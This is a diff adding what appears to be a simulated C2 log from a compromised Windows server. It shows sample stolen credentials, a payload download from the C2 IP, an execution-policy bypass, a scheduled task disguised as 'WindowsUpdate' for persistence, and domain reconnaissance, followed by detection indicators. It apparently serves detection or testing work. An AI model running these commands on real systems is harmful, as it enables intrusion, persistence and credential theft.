@@ -1,0 +1,38 @@
+﻿[C2_COMMUNICATION_LOG]
+Session ID: 87A3F9B2-451C-4D7E-9F21-6B83A2E94C71
+C2 Server: 185.142.53.78:8443
+Encryption: AES-256-CBC
+Beacon Interval: 60 seconds
+
+[EXFILTRATED_DATA]
+{
+  "credentials": [
+    {"domain": "corporate.local", "username": "admin.smith", "password_hash": "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"},
+    {"domain": "mail.company.com", "username": "john.doe", "password": "P@ssw0rd2024!"}
+  ],
+  "system_info": {
+    "hostname": "WS-7421-CORP",
+    "domain": "CORPORATE.INT",
+    "os": "Windows Server 2019",
+    "domain_admin": true
+  }
+}
+
+[COMMANDS_RECEIVED]
+2025-05-14 15:23:47 | EXEC: powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\update.ps1
+2025-05-14 15:24:12 | DOWNLOAD: http://185.142.53.78/payload.exe
+2025-05-14 15:24:33 | PERSIST: schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\System32\rundll32.exe" /sc ONLOGON /ru SYSTEM
+2025-05-14 15:25:01 | SCAN: net view /all && net user /domain && ipconfig /all
+
+[MALICIOUS_INDICATORS]
+- Detected: Process hollowing attempt
+- Detected: LSASS memory access
+- Detected: AMSI bypass pattern
+- Detected: PowerShell downgrade attack
+- Risk Score: 96/100
+
+[CURRENT_STATUS]
+Connection: ESTABLISHED
+Data exfiltrated: 2.4 MB
+Command queue: 3 pending
+Persistence: ACTIVE
